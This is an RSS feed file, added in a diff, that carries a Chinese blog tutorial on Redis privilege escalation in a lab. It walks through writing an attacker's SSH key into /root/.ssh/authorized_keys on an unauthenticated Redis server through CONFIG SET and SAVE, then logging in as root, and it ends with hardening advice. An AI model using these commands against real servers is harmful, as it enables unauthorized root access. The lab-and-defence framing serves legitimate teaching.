@@ -1,0 +1,130 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>My Violet Eva Garden • Posts by &#34;数据库安全&#34; tag</title>
+        <link>https://kiyomijin.github.io</link>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Tue, 27 Sep 2022 00:02:13 +0800</pubDate>
+        <lastBuildDate>Tue, 27 Sep 2022 00:02:13 +0800</lastBuildDate>
+        <category>数据库安全</category>
+        <category>原创</category>
+        <category>CTF小训</category>
+        <category>Misc</category>
+        <item>
+            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</guid>
+            <title>Redis提权攻击</title>
+            <link>https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Redis%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/</link>
+            <category>数据库安全</category>
+            <pubDate>Tue, 27 Sep 2022 00:02:13 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;Redis&lt;/strong&gt;（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI &lt;a href=&#34;https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80&#34;&gt;C 语言&lt;/a&gt;编写、支持网络、可基于内存亦可持久化的日志型、Key-Value&lt;a href=&#34;https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728&#34;&gt; 数据库&lt;/a&gt;，并提供多种语言的 API。从 2010 年 3 月 15 日起，Redis 的开发工作由 VMware 主持。从 2013 年 5 月开始，Redis 的开发由&lt;a href=&#34;https://baike.baidu.com/item/Pivotal&#34;&gt; Pivotal&lt;/a&gt; 赞助。&lt;/p&gt;
+&lt;h2 id=&#34;0x00-redis提权攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x00-redis提权攻击&#34;&gt;#&lt;/a&gt; 0x00 Redis 提权攻击&lt;/h2&gt;
+&lt;p&gt;​	&lt;strong&gt;Redis&lt;/strong&gt; 在默认情况下，会绑定在 0.0.0.0:&lt;strong&gt;6379&lt;/strong&gt; 上，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务 &lt;code&gt;暴露到公网&lt;/code&gt; 上。&lt;/p&gt;
+&lt;p&gt;​	如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。&lt;/p&gt;
+&lt;p&gt;​	攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;目标靶机&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Ubuntu18.04&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.143&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;攻击主机&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Kali2022&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;192.168.138.145&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;如果没有攻击机没有安装 ssh 则：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#安装&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo apt install openssh-server&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#启动ssh服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo service ssh start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;0x01-被攻击机部分准备工作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x01-被攻击机部分准备工作&#34;&gt;#&lt;/a&gt; 0x01 被攻击机部分准备工作&lt;/h2&gt;
+&lt;p&gt;在 Ubuntu 安装 redis 服务器&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo apt-get install redis-server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926212305161.png&#34; alt=&#34;image-20220926212305161&#34;&gt;&lt;/p&gt;
+&lt;p&gt;修改 /etc/redis/redis.conf，总共有三点：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo vim /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926212807655.png&#34; alt=&#34;image-20220926212807655&#34;&gt;&lt;/p&gt;
+&lt;p&gt;①去除 bind&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926213107025.png&#34; alt=&#34;image-20220926213107025&#34;&gt;&lt;/p&gt;
+&lt;p&gt;②daemonize yes&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926213521318.png&#34; alt=&#34;image-20220926213521318&#34;&gt;&lt;/p&gt;
+&lt;p&gt;③protected-mode no&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926232253189.png&#34; alt=&#34;image-20220926232253189&#34;&gt;&lt;/p&gt;
+&lt;p&gt;重启服务&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service redis stop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#以root身份启动redis服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo redis-server /etc/redis/redis.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#尝试在服务器上自己连一下&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(显示127.0.0.1:6379则OK)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926232522408.png&#34; alt=&#34;image-20220926232522408&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;0x02-攻击机部分准备工作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x02-攻击机部分准备工作&#34;&gt;#&lt;/a&gt; 0x02 攻击机部分准备工作&lt;/h2&gt;
+&lt;p&gt;在攻击机上生成 rsa 秘钥&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh-keygen -t rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926214148985.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;重定向到 key.txt&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cd /home/kali/.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(echo -e &amp;quot;\n\n&amp;quot;; cat id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; key.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926214549834.png&#34; alt=&#34;image-20220926214549834&#34;&gt;&lt;/p&gt;
+&lt;p&gt;第二句话的含义？其实就是在 id_rsa.pub 的前后加了一个回车&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926214811675.png&#34; alt=&#34;image-20220926214811675&#34;&gt;&lt;/p&gt;
+&lt;p&gt;之后，我们在攻击机（也就是我的 kali）上安装 redis-cli&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget http://download.redis.io/redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -zxf redis-stable.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 进入到 redis-stable 目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd redis-stable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 编译&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#拷贝&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#编译完成之后，再将 src 目录下的 redis-cli 拷贝到 /usr/bin/ 目录下一份，这样就可直接使用 redis-cli 了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo cp ./src/redis-cli /usr/bin/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926220032721.png&#34; alt=&#34;image-20220926220032721&#34;&gt;&lt;/p&gt;
+&lt;p&gt;出现如下字样就说明安装成功：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;redis-cli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;回车&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926220238790.png&#34; alt=&#34;image-20220926220238790&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将我们生成的 key.txt 放到远程主机 (也就是开了 redis 服务的服务器) 的 redis-cli 内存上，查看远程服务器的 ip 为：192.168.138.143&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926220116946.png&#34; alt=&#34;image-20220926220116946&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;0x03-开始攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-开始攻击&#34;&gt;#&lt;/a&gt; 0x03 开始攻击&lt;/h2&gt;
+&lt;p&gt;拿到 redis 的 shell 后基本操作：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;info  #查看redis的信息和服务器信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flushall 删除全部数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del key  删除键为key的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get key  得到参数key的数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926234426901.png&#34; alt=&#34;image-20220926234426901&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在我们的攻击机 (kali) 上运行如下代码：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;看到回显了OK以后&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli -h 192.168.138.143进入shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926222112479.png&#34; alt=&#34;image-20220926222112479&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将目录切换到 /root/.ssh&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dir /root/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926231146929.png&#34; alt=&#34;image-20220926231146929&#34;&gt;&lt;/p&gt;
+&lt;p&gt;设置数据库名，覆盖我们的文件（保存数据库的内容到 /root/.ssh/authorized_keys ）&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926232746706.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;最后，回到生成秘钥的终端：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#使用ssh命令 以root用户的身份 连接“被攻击机”的ip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.138.143&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220926232832651.png&#34; alt=&#34;image-20220926232832651&#34;&gt;&lt;/p&gt;
+&lt;p&gt;至此，redis 提权攻击完成。&lt;/p&gt;
+&lt;h2 id=&#34;0x04-修复建议安全加固&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-修复建议安全加固&#34;&gt;#&lt;/a&gt; 0x04 修复建议 / 安全加固&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;1. 禁止一些高危命令&lt;/strong&gt; (重启 redis 才能生效)&lt;/p&gt;
+&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;rename-command FLUSHALL &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rename-command CONFIG &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rename-command EVAL &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;或者另起名字&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;rename-command FLUSHALL &amp;quot;name1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rename-command CONFIG &amp;quot;name2&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rename-command EVAL &amp;quot;name3&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;来禁用远程修改 DB 文件地址&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2. 以低权限运行 Redis 服务&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;groupadd -r redis &amp;amp;&amp;amp; useradd -r -g redis redis&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;3. 为 Redis 添加密码验证&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;requirepass mypassword&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;4. 禁止外网访问 Redis&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bind 127.0.0.1 :1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;redis 3.2 之后，redis 增加了 protected-mode ，在这个模式下，非绑定 IP 或者没有配置密码时都会报错。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;5. 保证 authorized_keys 文件的安全&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;为了保证安全，您应该阻止其他用户添加新的公钥。&lt;/p&gt;
+&lt;p&gt;将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 400 ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;然而，用户还可以重命名～/.ssh，然后新建新的～/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置～./ssh 的 immutable 位权限：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;strong&gt;注意:&lt;/strong&gt; 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;6. 修改默认端口&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;修改 redis.conf 文件， 找到并修改原来的 &lt;code&gt;port 6379&lt;/code&gt;  ，比如改成 &lt;code&gt;port 17033&lt;/code&gt; ，让人摸不着头脑。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;port 17033 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
